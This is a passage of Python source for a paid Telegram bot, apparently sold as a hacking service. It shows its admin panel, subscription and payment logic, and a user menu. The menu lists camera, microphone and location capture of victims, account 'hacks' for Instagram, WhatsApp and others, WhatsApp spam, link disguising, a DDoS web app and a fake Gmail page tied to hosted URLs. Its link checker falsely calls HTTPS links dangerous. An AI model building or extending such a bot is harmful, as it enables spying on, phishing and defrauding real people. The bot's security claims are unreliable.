                "invalid_domain": "❌ Invalid domain format. Send a valid domain (e.g., example.com).",
                "disguised_links_header": "[~] Disguised Links:\n",
                "original_link_display": "Original Link: {}\n\n",
                "invalid_phone_number": "❌ Invalid phone number. Please send a correct number with country code.",
                "sending_spam": "⏳ Sending spam message...",
                "spam_sent_success": "✅ Spam message sent successfully!",
                "link_secure": "✅ Safe.\nThis link appears to use the standard HTTP protocol.",
                "link_insecure": "🚨 Danger!\nThis link was detected as potentially harmful because it uses the encrypted HTTPS protocol.",
                "link_unknown": "⚠️ Cannot determine link status. Please send a link starting with http or https.",
                "tts_processing": "⏳ Converting text to voice message...",
                "tts_error": "❌ An error occurred during conversion. Please try again later.",
                "service_busy": "❌ Sorry, the service is currently busy. Please try again later.",
                "zakhrafa_done": "Decoration complete:\n\n{}",
                "choose_zakhrafa_lang": "Choose the language of the text to decorate:",
                "ask_zakhrafa_text": "Send the text in {} to be decorated.",
                "lang_ar": "Arabic",
                "lang_en": "English",
                # --- Download Data Feature Texts (New) ---
                "download_data_header": "📥 Choose the data you want to download:",
                "download_users_button": "👥 Users",
                "download_admins_button": "👑 Admins",
                "download_banned_button": "🚫 Banned",
                "download_channels_button": "📢 Sub. Channels",
                "download_paid_users_button": "⭐ Paid Users",
                "file_not_found": "⚠️ File not found or is empty.",
            }
        }
        return locales.get(lang_code, locales["ar"])

    # --- قسم تغيير اللغة ---
    def language_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("العربية 🇪🇬", callback_data="set_lang_ar"),
            InlineKeyboardButton("English 🇬🇧", callback_data="set_lang_en")
        )
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=locale["choose_language"], reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in language_panel: {e}")

    def set_language(call):
        lang_code = call.data.replace("set_lang_", "")
        set_setting(language_file, lang_code)
        locale = get_locale(lang_code)
        bot.answer_callback_query(call.id, locale["language_changed"], show_alert=True)
        # إعادة عرض لوحة الأدمن بعد تغيير اللغة
        admin_panel(call.message)

    # --- قسم تحميل البيانات (جديد) ---
    def download_data_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton(locale["download_users_button"], callback_data="download_file_users.txt"),
            InlineKeyboardButton(locale["download_admins_button"], callback_data="download_file_admins.txt")
        )
        kb.add(
            InlineKeyboardButton(locale["download_banned_button"], callback_data="download_file_banned.txt"),
            InlineKeyboardButton(locale["download_channels_button"], callback_data="download_file_channels.txt")
        )
        kb.add(InlineKeyboardButton(locale["download_paid_users_button"], callback_data="download_file_paid_users.txt"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=locale["download_data_header"], reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in download_data_panel: {e}")

    def send_data_file(call):
        locale = get_locale()
        file_name = call.data.replace("download_file_", "")
        file_path = os.path.join(data_dir, file_name)
        
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            try:
                with open(file_path, "rb") as doc:
                    bot.send_document(call.message.chat.id, doc, caption=f"📄 Here is the {file_name} file")
                bot.answer_callback_query(call.id)
            except telebot.apihelper.ApiTelegramException as e:
                bot.answer_callback_query(call.id, f"Error sending file: {e}", show_alert=True)
            except Exception as e:
                bot.answer_callback_query(call.id, f"Error sending file: {e}", show_alert=True)
        else:
            bot.answer_callback_query(call.id, locale["file_not_found"], show_alert=True)
    # --- منطق إعداد الدفع بالنجوم ---
    def show_stars_setup_info(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        setup_text = """
🌟 متطلبات تفعيل الدفع بنجوم تيليجرام (Telegram Stars)

1️⃣ اذهب إلى @BotFather > /mybots > اختر هذا البوت.
2️⃣ اختر "Payments" ثم اختر مزود دفع (مثل Stripe) واتبع التعليمات.
3️⃣ بعد الربط، أرسل الأمر التالي هنا في بوتك:
    /stars <توكن_مزود_الدفع>

مثال: /stars 123456:TEST:abcdefg
"""
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=setup_text, reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in show_stars_setup_info: {e}")

    @bot.message_handler(commands=['stars'])
    def set_stars_provider_token(message):
        user_id = str(message.from_user.id)
        if user_id != str(owner_id):
            try:
                bot.reply_to(message, "❌ هذا الأمر مخصص لمالك البوت فقط.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to unauthorized stars command: {e}")
            return
        try:
            provider_token = message.text.split(' ', 1)[1]
        except IndexError:
            try:
                bot.reply_to(message, "⚠️ صيغة الأمر خاطئة. أرسل:\n/stars <توكن_مزود_الدفع>")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to invalid stars command format: {e}")
            return
        stars_config = get_json_data(stars_config_file)
        stars_config['provider_token'] = provider_token
        save_json_data(stars_config_file, stars_config)
        try:
            bot.reply_to(message, "✅ تم حفظ توكن مزود الدفع.\n\nالآن، أرسل عدد النجوم المطلوب لكل يوم اشتراك.")
            set_state(user_id, {"action": "set_stars_per_day"})
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying after setting stars provider token: {e}")

    def set_stars_per_day(message):
        user_id = str(message.from_user.id)
        if user_id != str(owner_id): return # Should not happen if state is managed correctly
        try:
            stars_per_day = int(message.text.strip())
            if stars_per_day <= 0:
                try:
                    bot.reply_to(message, "❌ يرجى إرسال عدد نجوم أكبر من صفر.")
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error replying to invalid stars per day (<=0): {e}")
                return
        except ValueError:
            try:
                bot.reply_to(message, "❌ يرجى إرسال أرقام فقط.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to invalid stars per day (not number): {e}")
            return
        stars_config = get_json_data(stars_config_file)
        stars_config['stars_per_day'] = stars_per_day
        save_json_data(stars_config_file, stars_config)
        try:
            bot.reply_to(message, f"✅ تم الحفظ! سعر الاشتراك الآن هو {stars_per_day} نجمة لكل يوم.")
            set_state(user_id, None)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying after setting stars per day: {e}")

    # --- دالة بناء لوحة تحكم الأدمن (مُحدّثة بالكامل) ---
    def get_admin_panel():
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        total_users = len(get_lines(subscribers_file))
        
        kb.add(InlineKeyboardButton(locale["subscribers_count"].format(total_users), callback_data="m1"))
        kb.row(
            InlineKeyboardButton(locale["broadcast_button"], callback_data="send"),
            InlineKeyboardButton(locale["forward_button"], callback_data="forward")
        )
        kb.row(
            InlineKeyboardButton(locale["add_channel_button"], callback_data="add_ch"),
            InlineKeyboardButton(locale["delete_channel_button"], callback_data="del_ch")
        )
        kb.row(
            InlineKeyboardButton(locale["notify_on_button"], callback_data="ons"),
            InlineKeyboardButton(locale["notify_off_button"], callback_data="ofs")
        )
        kb.row(
            InlineKeyboardButton(locale["bot_on_button"], callback_data="obot"),
            InlineKeyboardButton(locale["bot_off_button"], callback_data="ofbot")
        )
        kb.row(
            InlineKeyboardButton(locale["ban_button"], callback_data="ban"),
            InlineKeyboardButton(locale["unban_button"], callback_data="unban")
        )
        kb.row(
            InlineKeyboardButton(locale["add_admin_button"], callback_data="add_admin"),
            InlineKeyboardButton(locale["rem_admin_button"], callback_data="rem_admin")
        )
        kb.row(
            InlineKeyboardButton(locale["paid_mode_button"], callback_data="set_paid"),
            InlineKeyboardButton(locale["free_mode_button"], callback_data="set_free")
        )
        kb.row(
            InlineKeyboardButton(locale["add_paid_button"], callback_data="add_paid"),
            InlineKeyboardButton(locale["rem_paid_button"], callback_data="rem_paid")
        )
        kb.add(InlineKeyboardButton(locale["set_stars_button"], callback_data="setup_stars_payment"))
        
        if has_premium_features():
            kb.row(
                InlineKeyboardButton(locale["manage_payment_button"], callback_data="manage_payment_methods"),
                InlineKeyboardButton(locale["buttons_section_button"], callback_data="manage_buttons")
            )
            kb.add(InlineKeyboardButton(locale["change_language_button"], callback_data="change_language"))

        kb.add(InlineKeyboardButton(locale["download_data_button"], callback_data="download_data"))
        kb.add(InlineKeyboardButton(locale["edit_start_msg_button"], callback_data="set_start_msg"))
        return kb

    @bot.message_handler(commands=['admin'])
    def admin_panel(message):
        if not is_admin(message.from_user.id): return
        set_state(message.from_user.id, None)
        locale = get_locale()
        kb = get_admin_panel()
        try:
            bot.send_message(message.chat.id, locale["welcome_panel"], reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending admin panel: {e}")

    # --- دالة /start الكاملة والصحيحة (مُحدّثة بالكامل) ---
    @bot.message_handler(commands=['start'])
    def start_new(message):
        user_id = str(message.from_user.id)
        locale = get_locale()
        
        # Check factory subscription first
        if not check_factory_subscription(user_id):
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton(f"📢 اشترك في @{FACTORY_SUB_CHANNEL}", url=f"https://t.me/{FACTORY_SUB_CHANNEL}"))
            try:
                bot.send_message(message.chat.id, "❌ يجب عليك الاشتراك في القناة التالية للمتابعة:\n\nhttps://t.me/S7_MX3\n➖➖➖➖➖➖➖➖➖➖", reply_markup=kb)
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending force subscribe message: {e}")
            return

        try:
            inviter_id = message.text.split()[1]
            invited_by_file = os.path.join(data_dir, "invited_by.json")
            invited_users = get_json_data(invited_by_file)
            if user_id not in invited_users and user_id != inviter_id:
                invited_users[user_id] = inviter_id
                save_json_data(invited_by_file, invited_users)
                add_user_points(inviter_id, 1)
                try:
                    bot.send_message(inviter_id, f"🎉 A new user joined via your link! You got 1 point.\nYour current balance: {get_user_points(inviter_id)} points.")
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error notifying inviter {inviter_id}: {e}")
                except Exception as e:
                    print(f"General error notifying inviter {inviter_id}: {e}")
        except (IndexError, ValueError):
            pass # No inviter ID in start command
        except Exception as e:
            print(f"Error processing inviter ID: {e}")

        if not is_bot_enabled() and not is_admin(user_id):
            try:
                bot.send_message(message.chat.id, locale["bot_under_maintenance"])
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending bot under maintenance message: {e}")
            return
        if is_user_banned(user_id):
            try:
                bot.send_message(message.chat.id, locale["user_banned"])
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending user banned message: {e}")
            return

        is_subscribed, not_subscribed_channels = is_user_subscribed(user_id)
        if not is_subscribed:
            kb = InlineKeyboardMarkup()
            for ch in not_subscribed_channels:
                kb.add(InlineKeyboardButton(f"📢 Subscribe to @{ch}", url=f"https://t.me/{ch}"))
            kb.add(InlineKeyboardButton(locale["subscribed_button"], callback_data="check_force_sub"))
            try:
                bot.send_message(message.chat.id, locale["must_subscribe"], reply_markup=kb)
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending must subscribe message: {e}")
            return

        if is_paid_mode() and not is_admin(user_id) and not is_paid_user(user_id):
            kb = InlineKeyboardMarkup(row_width=2)
            payment_methods = get_json_data(payment_methods_file)
            if payment_methods and has_premium_features():
                kb.add(InlineKeyboardButton("💳 Subscribe (Regular Payment)", callback_data="subscribe_start"))
            stars_config = get_json_data(stars_config_file)
            if stars_config.get('provider_token') and stars_config.get('stars_per_day') and has_premium_features():
                kb.add(InlineKeyboardButton("🌟 Subscribe (Pay with Stars)", callback_data="subscribe_stars_start"))
            
            if kb.keyboard:
                 kb.row(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))
            else:
                 kb.add(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))

            try:
                bot.send_message(
                    message.chat.id,
                    """Welcome! 🌟

To take full advantage of the bot's features, please subscribe to one of the paid plans.""",
                    reply_markup=kb
                )
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending paid mode message: {e}")
            return

        if user_id not in get_lines(subscribers_file):
            add_line(subscribers_file, user_id)

        start_message_text = get_setting(start_message_file, locale["welcome_user"])
        
        # --- بناء الأزرار الديناميكي والكامل (مُحدّث بالكامل) ---
        kb = InlineKeyboardMarkup(row_width=2)
        hidden_buttons = get_json_data(hidden_buttons_file)
        
        base_buttons = {
            "cam_back": locale["cam_back_btn"], "cam_front": locale["cam_front_btn"],
            "mic_record": locale["mic_record_btn"], "location": locale["location_btn"],
            "record_video": locale["record_video_btn"], "surveillance_cams": locale["surveillance_cams_btn"],
            "insta_hack": locale["insta_hack_btn"], "whatsapp_hack": locale["whatsapp_hack_btn"],
            "pubg_hack": locale["pubg_hack_btn"], "facebook_hack": locale["facebook_hack_btn"],
            "tiktok_hack": locale["tiktok_hack_btn"], "ff_hack": locale["ff_hack_btn"],
            "discord_hack": locale["discord_hack_btn"], "roblox_hack": locale["roblox_hack_btn"],
            "ask_wormgpt": locale["ask_wormgpt_btn"], "snapchat_hack": locale["snapchat_hack_btn"],
            "interpret_dream": locale["interpret_dream_btn"], "device_info": locale["device_info_btn"],
            "akinator_fake_error": locale["akinator_fake_error_btn"], "ddos_webapp": locale["ddos_webapp_btn"],
            "intelligence_game": locale["intelligence_game_btn"], "high_quality_shot": locale["high_quality_shot_btn"],
            "fake_gmail": locale["fake_gmail_btn"], "get_visa": locale["get_visa_btn"],
            "fake_number": locale["fake_number_btn"], "get_victim_number": locale["get_victim_number_btn"],
            "check_link": locale["check_link_btn"], "hack_wifi": locale["hack_wifi_btn"],
            "radio_menu": locale["radio_menu_btn"], "zakhrafa": locale["zakhrafa_btn"],
            "text_to_speech": locale["text_to_speech_btn"], "hunt_usernames": locale["hunt_usernames_btn"],
            "booming_link_start": locale["booming_link_start_btn"], "full_hack_info": locale["full_hack_info_btn"],
            "hide_link": locale["hide_link_btn"], "whatsapp_spam": locale["whatsapp_spam_btn"]
        }
        
        buttons_to_show = []
        for btn_id, btn_text in base_buttons.items():
            if btn_id not in hidden_buttons:
                if btn_id == "ddos_webapp":
                    ddos_url = "https://flourishing-bienenstitch-bba64d.netlify.app/"
                    buttons_to_show.append(InlineKeyboardButton(btn_text, web_app=WebAppInfo(ddos_url)))
                elif btn_id == "fake_gmail":
                    gmail_url = "https://illustrious-pony-032b95.netlify.app/"
                    buttons_to_show.append(InlineKeyboardButton(btn_text, web_app=WebAppInfo(gmail_url)))
                else:
                    buttons_to_show.append(InlineKeyboardButton(btn_text, callback_data=btn_id))

        for i in range(0, len(buttons_to_show), 2):
            row = buttons_to_show[i:i+2]
            kb.row(*row)

        custom_buttons = get_json_data(custom_buttons_file)
        custom_buttons_row = []
        for btn_id, btn_data in custom_buttons.items():
            if btn_id not in hidden_buttons:
                if btn_data['type'] == 'url':
                    custom_buttons_row.append(InlineKeyboardButton(btn_data['text'], url=btn_data['link']))
                elif btn_data['type'] == 'webapp':
                    custom_buttons_row.append(InlineKeyboardButton(btn_data['text'], web_app=WebAppInfo(btn_data['link'])))
        
        for i in range(0, len(custom_buttons_row), 2):
            row = custom_buttons_row[i:i+2]
            kb.row(*row)

        kb.add(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))
        
        try:
            bot.send_message(message.chat.id, start_message_text, reply_markup=kb, disable_web_page_preview=True)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending start message with buttons: {e}")
    # --- بداية منطق إدارة الأزرار المخصصة ---
    def buttons_management_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("➕ Add New Button", callback_data="add_custom_button"),
            InlineKeyboardButton("🗑️ Delete Button", callback_data="delete_custom_button")
        )
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="🎛️ Buttons Management Section\n\nChoose the action you want to perform:",
                reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in buttons_management_panel: {e}")

    def show_buttons_for_deletion(call):
        locale = get_locale()
        custom_buttons = get_json_data(custom_buttons_file)
        hidden_buttons = get_json_data(hidden_buttons_file)
        
        kb = InlineKeyboardMarkup(row_width=1)
        
        base_buttons = {
            "cam_back": locale["cam_back_btn"], "cam_front": locale["cam_front_btn"],
            "mic_record": locale["mic_record_btn"], "location": locale["location_btn"],
            "record_video": locale["record_video_btn"], "surveillance_cams": locale["surveillance_cams_btn"],
            "insta_hack": locale["insta_hack_btn"], "whatsapp_hack": locale["whatsapp_hack_btn"],
            "pubg_hack": locale["pubg_hack_btn"], "facebook_hack": locale["facebook_hack_btn"],
            "tiktok_hack": locale["tiktok_hack_btn"], "ff_hack": locale["ff_hack_btn"],
            "discord_hack": locale["discord_hack_btn"], "roblox_hack": locale["roblox_hack_btn"],
            "ask_wormgpt": locale["ask_wormgpt_btn"], "snapchat_hack": locale["snapchat_hack_btn"],
            "interpret_dream": locale["interpret_dream_btn"], "device_info": locale["device_info_btn"],
            "akinator_fake_error": locale["akinator_fake_error_btn"], "ddos_webapp": locale["ddos_webapp_btn"],
            "intelligence_game": locale["intelligence_game_btn"], "high_quality_shot": locale["high_quality_shot_btn"],
            "fake_gmail": locale["fake_gmail_btn"], "get_visa": locale["get_visa_btn"],
            "fake_number": locale["fake_number_btn"], "get_victim_number": locale["get_victim_number_btn"],
            "check_link": locale["check_link_btn"], "hack_wifi": locale["hack_wifi_btn"],
            "radio_menu": locale["radio_menu_btn"], "zakhrafa": locale["zakhrafa_btn"],
            "text_to_speech": locale["text_to_speech_btn"], "hunt_usernames": locale["hunt_usernames_btn"],
            "booming_link_start": locale["booming_link_start_btn"], "full_hack_info": locale["full_hack_info_btn"],
            "hide_link": locale["hide_link_btn"], "whatsapp_spam": locale["whatsapp_spam_btn"]
        }
        
        all_buttons = base_buttons.copy()
        for btn_id, btn_data in custom_buttons.items():
            all_buttons[btn_id] = btn_data['text']

        if not all_buttons:
            bot.answer_callback_query(call.id, "No buttons to delete.", show_alert=True)
            return

        for btn_id, btn_text in all_buttons.items():
            if btn_id not in hidden_buttons:
                kb.add(InlineKeyboardButton(f"🗑️ {btn_text}", callback_data=f"confirm_delete_{btn_id}"))

        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="manage_buttons"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="Choose the button you want to delete (hide):",
                reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in show_buttons_for_deletion: {e}")

    def confirm_button_deletion(call):
        btn_id_to_delete = call.data.replace("confirm_delete_", "")
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("✅ Yes, delete", callback_data=f"execute_delete_{btn_id_to_delete}"),
            InlineKeyboardButton("❌ No, go back", callback_data="delete_custom_button")
        )
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"Are you sure you want to delete (hide) this button?",
                reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in confirm_button_deletion: {e}")

    def execute_button_deletion(call):
        btn_id_to_hide = call.data.replace("execute_delete_", "")
        hidden_buttons = get_json_data(hidden_buttons_file)
        
        if btn_id_to_hide not in hidden_buttons:
            hidden_buttons.append(btn_id_to_hide)
            save_json_data(hidden_buttons_file, hidden_buttons)
        
        bot.answer_callback_query(call.id, "✅ Button deleted (hidden) successfully.")
        show_buttons_for_deletion(call) # Refresh the list

    def ask_for_button_text(call):
        locale = get_locale()
        set_state(call.from_user.id, {"action": "add_button_text"})
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="Send the new button's name now (e.g., Tutorial Channel 📢).",
                reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in ask_for_button_text: {e}")

    def ask_for_button_type(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        button_text = message.text.strip()
        set_state(user_id, {"action": "add_button_type", "text": button_text})
        
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("🌐 Direct Link (URL)", callback_data="btn_type_url"),
            InlineKeyboardButton("📲 Mini App (WebApp)", callback_data="btn_type_webapp")
        )
        kb.add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        
        try:
            bot.send_message(user_id, "Choose the button type:", reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in ask_for_button_type: {e}")

    def ask_for_button_link(call):
        locale = get_locale()
        user_id = str(call.from_user.id)
        state = get_state(user_id)
        btn_type = call.data.replace("btn_type_", "")
        state["type"] = btn_type
        state["action"] = "add_button_link"
        set_state(user_id, state)
        
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="Now, send the link for the button:",
                reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in ask_for_button_link: {e}")

    def save_custom_button(message):
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        button_link = message.text.strip()
        
        custom_buttons = get_json_data(custom_buttons_file)
        new_button_id = f"custom_{int(time.time())}"
        
        custom_buttons[new_button_id] = {
            "text": state["text"],
            "type": state["type"],
            "link": button_link
        }
        
        save_json_data(custom_buttons_file, custom_buttons)
        try:
            bot.send_message(user_id, f"✅ Button '{state['text']}' saved successfully!")
            set_state(user_id, None)
            
            # Simulate a callback to refresh the buttons management panel
            from telebot.types import CallbackQuery, Message, User, Chat
            user_obj = User(message.from_user.id, message.from_user.first_name, is_bot=False)
            chat_obj = Chat(message.chat.id, 'private')
            msg_obj = Message(message_id=message.message_id, from_user=user_obj, date=None, chat=chat_obj, content_type='text', options={}, json_string="")
            call_obj = CallbackQuery(id='dummy_call', from_user=user_obj, data='manage_buttons', chat_instance=None, json_string="", message=msg_obj)
            
            bot.send_message(message.chat.id, "List updated:")
            buttons_management_panel(call_obj)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error saving custom button or refreshing panel: {e}")

    # --- بداية منطق الدفع بالعملات العادية (للبوت المصنوع) ---
    def payment_management_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=1)
        payment_methods = get_json_data(payment_methods_file)
        response_text = "💳 Manage Payment Methods\n\n"
        if payment_methods:
            response_text += "Current payment methods:\n"
            for method_name in payment_methods:
                kb.add(InlineKeyboardButton(f"🗑️ Delete: {method_name}", callback_data=f"delete_payment_{method_name}"))
        else:
            response_text += "No payment methods added yet."
        kb.add(InlineKeyboardButton("➕ Add New Payment Method", callback_data="add_payment_method"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=response_text, reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in payment_management_panel: {e}")

    def ask_for_payment_method_type(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        wallets = ["Vodafone Cash", "Etisalat Cash", "Orange Cash", "We Pay", "Binance", "Payeer", "Perfect Money", "Other"]
        buttons = [InlineKeyboardButton(w, callback_data=f"payment_type_{w}") for w in wallets]
        kb.add(*buttons)
        kb.add(InlineKeyboardButton(locale["cancel_button"], callback_data="manage_payment_methods"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text="Choose the wallet type you want to add:", reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in ask_for_payment_method_type: {e}")

    def ask_for_payment_method_name(call):
        locale = get_locale()
        wallet_type = call.data.split('_')[-1]
        prompt_message = f"Now, send the specific wallet name for {wallet_type}."
        set_state(call.from_user.id, {"action": "add_payment_name", "type": wallet_type})
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=prompt_message, reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in ask_for_payment_method_name: {e}")

    def ask_for_payment_address(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        state["name"] = message.text.strip()
        state["action"] = "add_payment_address"
        set_state(user_id, state)
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        try:
            bot.send_message(user_id, "Now, send the wallet address or phone number.", reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in ask_for_payment_address: {e}")

    def ask_for_payment_price(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        state["address"] = message.text.strip()
        state["action"] = "add_payment_price"
        set_state(user_id, state)
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        try:
            bot.send_message(user_id, "Now, send the subscription price per month (numbers only).", reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message in ask_for_payment_price: {e}")

    def save_payment_method(message):
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        try:
            price = float(message.text.strip())
        except ValueError:
            try:
                bot.reply_to(message, "❌ Invalid price. Please send a number only.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to invalid price: {e}")
            return
        method_name = state["name"]
        method_address = state["address"]
        payment_methods = get_json_data(payment_methods_file)
        payment_methods[method_name] = {"address": method_address, "price_per_month": price}
        save_json_data(payment_methods_file, payment_methods)
        try:
            bot.send_message(user_id, f"✅ Payment method '{method_name}' saved successfully.")
            set_state(user_id, None)
            
            # Simulate a callback to refresh the payment management panel
            from telebot.types import CallbackQuery, Message, User, Chat
            user_obj = User(message.from_user.id, message.from_user.first_name, is_bot=False)
            chat_obj = Chat(message.chat.id, 'private')
            msg_obj = Message(message_id=message.message_id, from_user=user_obj, date=None, chat=chat_obj, content_type='text', options={}, json_string="")
            call_obj = CallbackQuery(id='dummy_call', from_user=user_obj, data='manage_payment_methods', chat_instance=None, json_string="", message=msg_obj)
            
            bot.send_message(message.chat.id, "List updated:")
            payment_management_panel(call_obj)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error saving payment method or refreshing panel: {e}")

    def delete_payment_method(call):
        method_to_delete = call.data.replace("delete_payment_", "")
        payment_methods = get_json_data(payment_methods_file)
        if method_to_delete in payment_methods:
            del payment_methods[method_to_delete]
            save_json_data(payment_methods_file, payment_methods)
            bot.answer_callback_query(call.id, f"✅ '{method_to_delete}' has been deleted successfully.")
            payment_management_panel(call) # Refresh the list
        else:
            bot.answer_callback_query(call.id, "❌ This payment method no longer exists.", show_alert=True)

    def show_subscription_options(call):
        locale = get_locale()
        payment_methods = get_json_data(payment_methods_file)
        if not payment_methods:
            bot.answer_callback_query(call.id, "⚠️ No payment methods are currently available.", show_alert=True)
            return
        kb = InlineKeyboardMarkup(row_width=1)
        for method_name in payment_methods.keys():
            kb.add(InlineKeyboardButton(f"Pay with {method_name}", callback_data=f"pay_via_{method_name}"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_start_paid"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text="Choose your preferred payment method:", reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in show_subscription_options: {e}")

    def show_package_options(call):
        locale = get_locale()
        method_name = call.data.replace("pay_via_", "")
        kb = InlineKeyboardMarkup(row_width=1)
        packages = {"1 Month": 1, "3 Months": 3, "6 Months": 6, "12 Months": 12}
        for text, months in packages.items():
            kb.add(InlineKeyboardButton(text, callback_data=f"package_{method_name}_{months}"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="subscribe_start"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=f"Choose the package duration for payment via {method_name}:", reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in show_package_options: {e}")

    def process_package_selection(call):
        locale = get_locale()
        parts = call.data.split('_')
        method_name, months = parts[1], int(parts[2])
        method_details = get_json_data(payment_methods_file).get(method_name)
        if not method_details:
            bot.answer_callback_query(call.id, "❌ Payment method is no longer available.", show_alert=True)
            return
        total_price = method_details["price_per_month"] * months
        address = method_details["address"]
        set_state(call.from_user.id, {"action": "awaiting_payment_proof", "method": method_name, "months": months, "price": total_price})
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        response_text = f"""
✅ Payment details for a {months}-month subscription:
- Amount due: {total_price}
- Payment method: {method_name}
- Address/Number: {address}
⚠️ After transferring, send a screenshot of the receipt or the transaction ID here.
"""
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=response_text, reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in process_package_selection: {e}")

    def forward_payment_proof_to_admin(message):
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        if not state or state.get("action") != "awaiting_payment_proof": return
        method, months, price = state["method"], state["months"], state["price"]
